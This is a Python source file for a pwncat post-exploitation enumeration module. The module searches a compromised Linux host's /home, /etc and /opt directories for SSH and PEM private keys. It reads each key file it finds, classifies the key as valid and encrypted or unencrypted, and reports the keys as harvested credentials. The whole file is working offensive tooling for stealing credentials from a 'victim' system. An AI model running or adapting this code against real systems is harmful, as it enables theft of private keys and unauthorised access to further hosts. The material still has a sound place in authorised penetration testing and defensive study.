#!/usr/bin/env python3

import rich.markup
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.primitives.serialization import (
    load_pem_private_key,
    load_ssh_private_key,
)

import pwncat
from pwncat.facts import PrivateKey
from pwncat.modules import Status
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


def _classify_key(content: str):
    """Try to parse the given private key content.

    Returns ``(valid, encrypted)``. ``valid`` is ``True`` when the data
    looks like a real private key (encrypted or not). ``encrypted`` is
    ``True`` when the key is password-protected.
    """

    data = content.encode("utf-8", errors="replace")

    # The PEM/OpenSSH framing is what tells us whether *anything*
    # private-key-shaped is present at all. We use it to distinguish
    # "encrypted key we can't load without a password" from "this
    # blob isn't a key in the first place". Without this, cryptography
    # versions older than 44 raise ``ValueError`` for encrypted ed25519
    # OpenSSH keys (rather than ``TypeError``) and we would mis-classify
    # a valid encrypted key as garbage.
    looks_like_private_key = (
        b"BEGIN OPENSSH PRIVATE KEY" in data
        or b"BEGIN RSA PRIVATE KEY" in data
        or b"BEGIN DSA PRIVATE KEY" in data
        or b"BEGIN EC PRIVATE KEY" in data
        or b"BEGIN PRIVATE KEY" in data
        or b"BEGIN ENCRYPTED PRIVATE KEY" in data
    )

    for loader in (load_ssh_private_key, load_pem_private_key):
        try:
            loader(data, password=None)
            return True, False
        except TypeError:
            # Modern cryptography raises TypeError on encrypted-but-no-password.
            return True, True
        except (ValueError, UnsupportedAlgorithm):
            # Wrong format for this loader, try the next one.
            continue

    # All loaders refused without raising the dedicated "encrypted"
    # signal. If we still saw a PEM/OpenSSH header it is overwhelmingly
    # likely the key is encrypted (and the loader chose ValueError
    # instead of TypeError to report it).
    if looks_like_private_key:
        return True, True

    return False, False


class Module(EnumerateModule):
    """
    Search the victim file system for configuration files which may
    contain private keys. This uses a regular expression based search
    to find files whose contents look like a SSH private key.
    """

    PROVIDES = ["creds.private_key"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session: "pwncat.manager.Session"):

        # This uses a list because it does multiple things
        # 1. It _finds_ the private key locations
        # 2. It tries to _read_ the private keys
        # This needs to happen in two loops because it has to happen one at
        # at a time (you can't have two processes running at the same time)
        # ..... (right now ;)
        facts = []

        # Search for private keys in common locations
        proc = session.platform.Popen(
            "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null",
            shell=True,
            text=True,
            stdout=pwncat.subprocess.PIPE,
        )

        with proc.stdout as pipe:
            yield Status("searching for private keys")
            for line in pipe:
                line = line.strip().split(" ")
                uid, path = int(line[0]), " ".join(line[1:])
                yield Status(f"found [cyan]{rich.markup.escape(path)}[/cyan]")
                facts.append(PrivateKey(self.name, path, uid, None, False))

        # Ensure proc is cleaned up
        proc.wait()

        for fact in facts:
            try:
                yield Status(f"reading [cyan]{rich.markup.escape(fact.path)}[/cyan]")
                with session.platform.open(fact.path, "r") as filp:
                    fact.content = filp.read().strip().replace("\r\n", "\n")

                valid, encrypted = _classify_key(fact.content)
                if not valid:
                    continue

                fact.encrypted = encrypted
                yield fact
            except (PermissionError, FileNotFoundError):
                continue
